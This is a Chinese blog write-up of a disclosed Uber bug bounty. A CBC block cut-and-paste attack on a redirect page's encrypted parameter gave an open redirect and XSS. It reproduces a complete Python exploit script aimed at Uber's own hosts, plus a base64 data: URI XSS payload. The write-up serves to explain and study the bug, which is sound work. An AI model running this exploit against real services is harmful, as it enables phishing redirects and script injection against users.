# 漏洞散记
##  Uber链接弱加密/设计不当
> 漏洞本身的名字是CBC "cut and paste" attack may cause Open Redirect(even XSS)，但是
我个人觉得加密算法的薄弱以及程序设计不当才是这次漏洞的根本原因

> 漏洞价值:500$

## 漏洞过程

**redirect page**一直是Bug高发地，这次也不例外，问题依旧处于**redirect page**，程序本身的设计是脚本
解密参数**EQ**后的值，然后根据值进行跳转

然而**redirect page**的url是这样的：
```
http://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bec4638573e1cff2ba6cc032c5986fe5497c86cfaefb22406bd798a7f8312fde3acd3757bd120dfa0e40f3acb1e99e66c
```

### 关键点

但是作者在这个地方不断的进行尝试，推导出**it looks like encryted by CBC mode and block size is 8.**

接着作者又发现了URL:
```
https://pages.et.uber.com/hangzhou1year/?uuid=1234
```
这个URL能encrypted自己

作者给了例子：

Access

```
https://pages.et.uber.com/hangzhou1year/?uuid=1234
```

and view the source you will see

```
https://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bec4638573e1cff2ba6cc032c5986fe5497c86cfaefb22406bd798a7f8312fde3acd3757bd120dfa025d290b1cf9a6e85
```
Above is the encrypted result of string``` https://pages.et.uber.com/hangzhou1year/?uuid=1234```

## 利用合理的地方做不合理的事情

> 个人认为漏洞利用最关键的部分

之前我一直在思索着，作者是凭什么自由掌握加密和解密的？也就是思索着作者真的只是通过两个URL推算出了程序完整的加密算法？

下载一份作者写出来的payload

```python
import requests
from urllib import quote
decrypt_url = 'http://pages.et.uber.com/Redirect.aspx?EQ='
encrypt_url = 'http://pages.et.uber.com/hangzhou1year/?uuid='


def encrypt(s):
    padding = 'AAAAA'
    r = requests.get(encrypt_url + padding + quote(s))
    c = r.content.split('" target="_blank"><img src="https://image.et.uber.com/lib/fe93127371650c7f71/m/1/wechat_grey.png')[0]
    c = c.split('<a href="http://pages.et.uber.com/Redirect.aspx?EQ=')[1]
    return c.decode('hex')



orginal = '5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bec4638573e1cff2ba6cc032c5986fe5497c86cfaefb22406bd798a7f8312fde3acd3757bd120dfa0d93240dd01ab9842c9a3bb1c67bf3b0ea3365c119cd00fa8ffe28f9d60d8811964aa64e6f206b185c9cb1916053b4a7541e259fdad31ccd2ca71f0d8119e6578012f248f67557f82be355621f25a48185fcdff959df60dedc1ff0720d0425b921924321b894eebbc0128fce2b552959e'.decode('hex')


padding = 'A'*10
cipher = encrypt(padding + '@orange.tw/?' + padding)



orginal = [orginal[x:x+8] for x in range(0, len(orginal), 8)]
cipher = [cipher[x:x+8] for x in range(0, len(cipher), 8)]
footer = orginal[-2:]
header = orginal[:20]


payload = header + cipher[-5:-1] + footer
payload = ''.join(payload).encode('hex')
# print payload
r = requests.get(decrypt_url + payload, allow_redirects=False)

print decrypt_url + payload

location = r.headers['location'].replace('%ef%bf%bd', '_')

print location
```
简单来说的话，作者就是利用程序本身加密我们需要加密的东西，也就是利用

```
decrypt_url = 'http://pages.et.uber.com/Redirect.aspx?EQ='
encrypt_url = 'http://pages.et.uber.com/hangzhou1year/?uuid='
```
重定向的设计不当，把我们想要的东西加解密

请记得中间的加密需要padding

## Exploiting

作者得出了加密的具体方式，所以现在作者已经能够encrypt something by **?uuid=whatever** and decrypt something by **?EQ=whatever**

同时作者尝试了

```
data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
```

生成了密文填充到重定向中成功的alert

那么在这个**redirect page**中，作者同时挖掘到了xss与URL Redirector两种漏洞

##　结语

个人认为此漏洞精彩的地方不在于其攻击方式的复杂程度，而在于其对于一个可能存在漏洞的点的深入的思考与挖掘能力
将程序整个运行机制相串联，找出其中并不是合理的地方加以利用，从而使得漏洞点扩大
